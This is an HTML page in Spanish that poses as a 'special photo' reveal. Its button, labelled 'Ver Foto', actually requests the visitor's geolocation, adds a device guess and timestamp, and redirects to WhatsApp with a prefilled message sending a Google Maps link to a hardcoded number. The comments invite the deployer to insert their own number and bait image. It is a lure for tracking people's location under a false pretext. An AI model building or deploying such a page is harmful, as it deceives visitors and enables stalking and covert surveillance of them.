<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tu Foto Especial</title>
    <style>
        body {
            margin: 0; padding: 0; background-color: #111; color: white;
            font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .container { text-align: center; width: 90%; max-width: 400px; }
        
        /* Estilo de la imagen */
        .photo-frame {
            border: 5px solid white;
            box-shadow: 0 0 20px rgba(255,255,255,0.2);
            margin-bottom: 20px;
            overflow: hidden;
        }
        img { width: 100%; height: auto; display: block; }
        
        button {
            background-color: #25D366; /* Color WhatsApp */
            color: white; border: none; padding: 15px 30px; 
            font-size: 18px; border-radius: 30px; cursor: pointer;
            font-weight: bold; width: 100%;
        }
        button:hover { opacity: 0.9; }
    </style>
</head>
<body>

    <div class="container">
        <!-- CAMBIA ESTE LINK POR LA FOTO QUE QUIERAS MOSTRAR -->
        <div class="photo-frame">
            <img src="https://images.unsplash.com/photo-1518005052357-e9847508d5ee?w=500" alt="Foto Sorpresa">
        </div>

        <h2>¿Quieres ver de qué se trata?</h2>
        <button id="btnView" onclick="enviarUbicacion()">Ver Foto</button>
    </div>

    <script>
        // TU NÚMERO DE WHATSAPP AQUÍ
        const myNumber = "51929207065"; 

        function enviarUbicacion() {
            const btn = document.getElementById('btnView');
            btn.innerText = "Obteniendo ubicación...";

            if (!navigator.geolocation) {
                alert("Tu navegador no soporta geolocalización.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Datos del Celular
                    const device = detectDevice();
                    const date = new Date().toLocaleString();

                    // Crear enlace de Google Maps
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                    // Mensaje final
                    const message = `📸 ¡Hola! Acabo de ver la foto.\n\n` +
                                    `📍 Ubicación: ${mapsLink}\n` +
                                    `📱 Celular: ${device}\n` +
                                    `🕒 Hora: ${date}`;

                    // Abrir WhatsApp
                    window.location.href = `https://wa.me/${myNumber}?text=${encodeURIComponent(message)}`;
                },
                () => {
                    btn.innerText = "Permiso denegado";
                    alert("No pudiste obtener tu ubicación.");
                }
            );
        }

        function detectDevice() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad/.test(ua)) return "Apple iPhone/iPad";
            if (/Android/.test(ua)) {
                if (/SM-G99|SM-S91|SM-A53/.test(ua)) return "Samsung Galaxy";
                return "Dispositivo Android";
            }
            return "Otro dispositivo";
        }
    </script>
</body>
</html>
